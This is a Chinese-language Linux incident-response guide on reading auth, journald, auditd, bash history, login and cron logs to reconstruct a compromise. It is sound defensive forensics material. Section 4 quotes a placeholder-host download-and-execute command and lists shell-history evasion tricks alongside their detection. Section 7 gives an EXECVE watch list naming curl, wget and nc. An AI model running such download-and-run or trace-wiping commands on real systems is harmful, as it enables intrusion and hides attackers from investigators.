# Linux 日志分析（应急溯源）

> 定位：Linux 失陷事件的第一证据源。目标是「从日志里把攻击者的时间线、来源 IP、执行的命令、篡改点还原出来」，而不是只看有没有报错。
> 本文为自写原创方法论，来源链接见文末「来源」节。

---

## 0. 先确定日志体系与发行版

排查前先确认目标用哪套日志，否则查错文件会得出「没有痕迹」的误判：

| 发行版 | 认证日志 | cron 日志 | 内核/syslog | 是否 systemd-journald |
| :--- | :--- | :--- | :--- | :--- |
| RHEL / CentOS / Rocky / Fedora | `/var/log/secure` | `/var/log/cron` | `/var/log/messages` | 是 |
| Debian / Ubuntu | `/var/log/auth.log` | `/var/log/syslog` 内（或独立 cron） | `/var/log/syslog`、`/var/log/kern.log` | 是 |
| 旧 sysvinit / busybox | `/var/log/auth.log` 或 `/var/log/secure` | 视 rsyslog 配置 | `/var/log/messages` | 否（走 rsyslog） |

快速确认：

```bash
# 1. 发行版与版本
cat /etc/os-release | grep -E '^(ID|PRETTY_NAME)='

# 2. 是否 journald 主导（有 journal 二进制且 systemd 运行中）
which journalctl && ps -p 1 -o comm=

# 3. rsyslog 转发规则（决定 auth 日志落到哪个文件）
grep -vE '^\s*#|^\s*$' /etc/rsyslog.conf /etc/rsyslog.d/*.conf 2>/dev/null | grep -iE 'auth|cron|messages'
```

判据：`/etc/rsyslog.conf` 里 `authpriv.*` 指向的文件就是认证日志真实落点；若被攻击者改过路径，原始 `/var/log/secure` 会停止增长——这本身就是一条篡改线索。

---

## 1. 认证日志：SSH 爆破与成功登录还原

### 1.1 失败登录（爆破）聚合

```bash
# 按来源 IP 聚合 Failed password（RHEL 系）
grep 'Failed password' /var/log/secure* | \
  awk '{for(i=1;i<=NF;i++) if($i=="from") {print $(i+1)}}' | \
  sort | uniq -c | sort -rn | head -30

# Debian/Ubuntu 用 auth.log
grep 'Failed password' /var/log/auth.log* | \
  grep -oE 'from [0-9]{1,3}(\.[0-9]{1,3}){3}' | \
  awk '{print $2}' | sort | uniq -c | sort -rn | head -30
```

判据：
- 单一来源 IP 在短时间窗（如 5 分钟内）`Failed password` 出现几十到几百次 = 典型爆破。
- 字段级关注：`for (invalid user)? <user> from <src> port <p> ssh2`——`invalid user` 说明是字典探测用户名，命中率极低但能看出字典内容。

误报规避：
- 正常的偶尔输错密码（个位数）不是爆破；阈值建议「≥20 次 / 5 分钟」才告警。
- 网关/扫描器会触发 `Connection closed by ... [preauth]` 而非 `Failed password`，两者要分开统计，别把端口扫描混进爆破计数。

### 1.2 成功登录还原

```bash
# 成功登录（RHEL）
grep -E 'Accepted (password|publickey)' /var/log/secure* | \
  awk '{print $1, $2, $3, $9, $11, $13}' | tail -50

# 统一按「时间 用户 来源IP」输出（兼容两种发行版）
cat /var/log/secure* /var/log/auth.log* 2>/dev/null | \
  grep -E 'Accepted ' | \
  sed -E 's/.*Accepted (password|publickey) for ([^ ]+) from ([0-9.]+).*/\2 \3/' | \
  sort | uniq -c | sort -rn
```

判据：
- `Accepted password for root from <公网IP>` 且该 IP 之前有大量 `Failed password` = 爆破成功，失陷时间点即这条的时间戳。
- `Accepted publickey for <user>` 但该用户从未配过 authorized_keys，或来源是异常 IP = 私钥被窃或后门公钥登录。

误报规避：内网运维 IP 的正常 key 登录会大量出现 `Accepted publickey`，必须与资产台账（已知运维 IP/用户）比对后再定性。

### 1.3 sudo / su 提权痕迹

```bash
# sudo 执行记录（RHEL）
grep -E 'sudo:|COMMAND=' /var/log/secure* | tail -100

# 提取「谁 在 何时 以 sudo 执行了什么」三字段
grep 'COMMAND=' /var/log/secure* 2>/dev/null | \
  sed -E 's/.*sudo:[[:space:]]+([^ ]+) : TTY=.*COMMAND=(.*)/\1 | \2/' | tail -100

# su 切换记录
grep -E 'su:|session opened' /var/log/secure* 2>/dev/null | grep -iE 'su|session' | tail -50
```

判据：失陷后攻击者常见动作 `sudo -l`、`sudo su`、`sudo bash`、`sudo systemctl ...`；`COMMAND=` 字段里出现 `curl|wget|chmod +x|sh -c` 之类与基线不符的命令要重点看。

---

## 2. journald：按服务/启动周期回溯

journald 是 systemd 的统一日志，很多发行版默认 `secure`/`auth.log` 只留一份 rsyslog 转出副本，真正完整记录在 journal 里。

```bash
# 按单元查看 sshd 全部日志（含启动以来的）
journalctl -u sshd --no-pager | tail -100

# 按本次启动周期回溯（-b 0 = 本次启动；-b -1 = 上一次启动，找历史残留）
journalctl -b -1 -u sshd --no-pager | tail -50

# 按时间窗精确切片（攻击发生前后）
journalctl --since "2025-08-01 00:00:00" --until "2025-08-02 23:59:59" --no-pager

# 全量查某来源 IP 的所有痕迹（跨单元）
journalctl --no-pager -o short-iso | grep '1.2.3.4' | tail -100

# 只看错误级别与告警（服务崩溃/被 kill）
journalctl -p err -b -1 --no-pager
```

判据：
- `journalctl -b -1`（上次启动）能挖出「本次重启后已被清理」的历史痕迹——攻击者常靠重启清除内存态后门，但 journal 落盘保留了旧记录。
- `journalctl -o short-iso` 输出带完整 ISO 时间戳，便于与文件 mtime/进程启动时间做时间线对齐。

误报规避：journald 会记录大量系统噪音（NetworkManager、systemd 自身），务必用 `-u <单元>` 或 `--since/--until` 收敛，不要裸 `journalctl` 全文刷屏。

---

## 3. auditd：内核级细粒度审计（攻击链核心证据）

auditd 记录 syscall 级事件，能回答「谁在何时用什么命令改了什么文件」，是爆破后提权/持久化还原的核心。

### 3.1 关键查询

```bash
# 先确认 auditd 是否在跑、规则是否被清空（攻击者常先 flush 规则）
auditctl -l            # 列当前规则（空 = 被清空或未配置）
auditctl -s            # 状态（enabled 状态、lost 记录数）

# 按时间窗查所有审计事件
ausearch -ts 08/01/2025 00:00:00 -te 08/02/2025 23:59:59 | head -200

# 查某用户的全部审计记录
ausearch -ua root -i | tail -100

# 查对特定文件的访问/修改（-f 文件名）
ausearch -f /etc/passwd -i | tail -50

# 查失败的系统调用（提权尝试常伴随 EPERM/EACCES 失败）
ausearch -m SYSCALL --success no -i | tail -100

# 查命令执行（需已配置 execve 规则）
ausearch -m EXECVE -i | tail -100
```

### 3.2 aureport 汇总报表

```bash
aureport -ts 08/01/2025 00:00:00 -te 08/02/2025 23:59:59   # 总览
aureport -l          # 登录事件汇总（成功/失败、来源 IP）
aureport -f          # 文件访问汇总
aureport -x          # 可执行文件执行汇总（EXECVE）
aureport -au         # 认证事件汇总
aureport -m          # 系统调用失败/异常汇总
aureport -i          # 解释型（-i 把数值 uid/syscall 翻译成可读名）
```

判据：
- `aureport -l` 里出现异常 IP 的成功登录 + 紧随其后的 `-x` 里大量 `sudo`/`useradd`/`crontab` = 失陷后被利用的完整链。
- `aureport -m` 里异常多的 `-13 (EACCES)` 失败 syscall = 有人在做越权试探（提权/读敏感文件）。

### 3.3 取证字段级解读

`ausearch -m SYSCALL -i` 单条关键字段：

| 字段 | 含义 | 判据 |
| :--- | :--- | :--- |
| `type=SYSCALL` | 系统调用 | 事件主体 |
| `arch=c000003e` | x86_64 架构 | 常量 |
| `syscall=execve` | 执行的 syscall | 关注 `execve`/`openat`/`connect` |
| `success=yes/no` | 是否成功 | `no` + `openat` 敏感文件 = 越权读取 |
| `comm="sh"` `exe="/bin/bash"` | 进程与可执行文件 | 看有没有可疑路径 |
| `auid=1000 uid=0` | 审计 uid 与实际 uid | `auid!=uid` 且 uid=0 = 提权 |
| `key="..."` | 规则 key | 按 key 检索同类事件 |

误报规避：auditd 未配 `-w` 文件规则和 `-a execve` 规则时，`ausearch -m EXECVE` 会空白——先 `auditctl -l` 确认规则是否在位，再下「没有命令执行记录」的结论。

---

## 4. bash history：命令历史与绕过检测

### 4.1 时间戳与记录完整性

```bash
# 查看当前用户历史（默认无时间戳）
history
cat ~/.bash_history

# 给历史加时间戳（排查时建议先设置，便于后续定位）
export HISTTIMEFORMAT='%F %T '
history

# 全量扫所有用户的历史文件（含 root 与已登录用户）
find /home /root -maxdepth 2 -name '.bash_history' -o -name '.zsh_history' -o -name '.mysql_history' 2>/dev/null | \
  while read f; do echo "=== $f ==="; tail -50 "$f"; done
```

判据：
- 出现 `wget http://x.x.x.x/xxx.sh -O /tmp/xxx.sh && sh /tmp/xxx.sh`、`curl ... | bash`、`chmod +x`、`crontab -e` 等 = 典型投毒/拉活。
- 文件大小异常小（如只有几行）但系统已运行很久 = 历史被清空过（见 4.2）。

### 4.2 历史被绕过/清空的检测（对抗面）

攻击者常用手段及检测点：

| 手段 | 检测方法 |
| :--- | :--- |
| `history -c` / `rm ~/.bash_history` | 文件时间戳突变为近期、内容锐减；用 `stat ~/.bash_history` 看 mtime |
| `unset HISTFILE HISTSIZE` / `export HISTFILE=/dev/null` | 会话结束后不落盘——本会话命令「凭空消失」，只能靠 auditd/pspy 补 |
| 命令前加空格（`HISTCONTROL=ignorespace`） | 该条不进历史；与 auditd EXECVE 记录比对可发现「历史里没有但实际执行过」 |
| `kill -9 $$` 强杀 shell | 缓冲区未刷盘，本次会话命令丢失 |
| 改用非交互 shell | `ssh host "cmd"` 直接执行不记历史——查 sshd 日志的 `Accepted` 后有无紧随的 `session` |

综合判据：**拿「auditd/pspy 记录的已执行命令」与「bash_history 里能看到的命令」做差集**，差集里的高危命令就是被刻意隐藏的痕迹。

误报规避：`HISTCONTROL=ignorespace` 是部分发行版默认行为，空格开头的普通命令（如 ` ls`）不进历史不代表恶意，要结合命令内容判断。

---

## 5. 登录痕迹：last / lastb / wtmp / btmp / utmp / lastlog

```bash
last -a -i          # 登录历史（wtmp），含来源 IP
last -F -x          # 含关机/重启/runlevel 变更，-F 显示完整时间
lastb -a -i         # 失败登录（btmp），爆破证据
lastlog             # 每个账户的最后登录（lastlog 文件）
who / w             # 当前在线（utmp）
cat /var/log/lastlog | strings | tail   # lastlog 原始内容（含账户最后登录 IP）
```

判据：
- `lastb` 里同一 IP 海量记录 = 爆破源；`last` 里该 IP 随后出现成功登录 = 爆破成功（对齐 secure 日志）。
- `last` 里出现 `reboot`/`shutdown` 时间点与告警时间点重合 = 攻击者清理痕迹后重启。
- `lastlog` 里某个长期不用的账户突然「最后登录」变成近期 = 该账户被利用（可能是后门账户）。

字段级注意：`last -a` 默认把来源显示为 hostname，`-i` 强制显示 IP；`last -F` 显示 `still logged in` 时用 `who` 对照 utmp 看当前在线会话。

误报规避：`lastb` 里 `ssh:notty` + 内网 IP 的少量失败是正常运维输错；`last` 里 `from 0.0.0.0`/`console` 是本地物理登录，不是网络攻击。

---

## 6. cron 日志：计划任务执行痕迹

```bash
# RHEL 系独立 cron 日志
grep -E 'CRON|CMD' /var/log/cron* | tail -100

# Debian/Ubuntu 在 syslog 内
grep -E 'CRON|CMD' /var/log/syslog* | tail -100

# 提取「执行了什么命令 + 执行用户」
grep 'CMD' /var/log/cron* 2>/dev/null | \
  sed -E 's/.*\((.*)\) CMD \((.*)\)/\1 | \2/' | sort | uniq -c | sort -rn | head -40
```

判据：
- 高频执行（如每分钟）的 `wget|curl|sh|base64 -d|/tmp/xxx` = 挖矿/后门拉活。
- `CMD` 指向 `/dev/shm/`、`/tmp/`、`/var/tmp/` 下脚本 = 高危（见 persistence 篇）。
- cron 日志里「只有 `(root) CMD` 但没有对应 crontab 文件」= 攻击者删了计划任务文件但执行记录还在。

误报规避：系统自带的 cron（`anacron`、`run-parts /etc/cron.daily`、`logrotate`）会大量出现，先建立「正常 cron 基线」再挑异常。

---

## 7. 低噪声审计配置思路（SIEM 接入前必读）

日志全开会导致海量噪音，真正有用的攻击信号被淹没。低噪声审计的核心是「只记高风险行为，且每条都能落成可检索的 key」。

### 7.1 auditd 规则（文件与进程两个维度）

```bash
# 关键文件写监控（-p wa = write+attribute）
auditctl -w /etc/passwd -p wa -k identity_change
auditctl -w /etc/shadow -p wa -k identity_change
auditctl -w /etc/sudoers -p wa -k sudoers_change
auditctl -w /etc/crontab -p wa -k cron_change
auditctl -w /etc/ld.so.preload -p wa -k ldso_change
auditctl -w /etc/systemd/system -p wa -k unit_change
auditctl -w /root/.ssh/authorized_keys -p wa -k ssh_key

# 进程执行监控（EXECVE，量大建议只记高危命令）
auditctl -a always,exit -F arch=b64 -S execve -k exec
```

判据：`ausearch -k identity_change -i` 直接捞出「谁改了口令文件」，把海量 syscall 收敛成几条高价值事件。

### 7.2 低噪声原则

1. **按 key 聚合而非按 syscall 聚合**：规则带 `-k <语义key>`，检索时 `ausearch -k` 一查一个面。
2. **只记写/改，不记读**：`-p wa`（write+attr）比 `-p war`（含 read）噪音低一个量级。
3. **EXECVE 用黑白名单**：记录 `sudo|sh|bash|crontab|curl|wget|base64|nc` 等 shell 相关，屏蔽高频的 `ls`/`ps`/`top` 运维噪音。
4. **时间窗采样**：SIEM 侧按「失败认证 → 成功认证 → EXECVE → 文件写」四类事件做关联规则，单类不告警、跨类才告警，可显著降误报。

---

## 来源

- auditd / linux-audit 用户态工具：https://github.com/linux-audit/audit-userspace
- Linux SIEM 低噪声审计配置集（auditd/osquery/falco）：https://github.com/maxvarm/linux-siem-audit-configs
- 本库 `cookbook-linux/12-常规安全检查.md` 0x17「日志」、0x02「history 信息」、0x06「登录信息」、0x29「计划任务日志」（GPL-3.0 原文）
- 本库 `cookbook-linux/16-知识点附录.md` 0x06「history 无记录的可能原因」（GPL-3.0 原文）
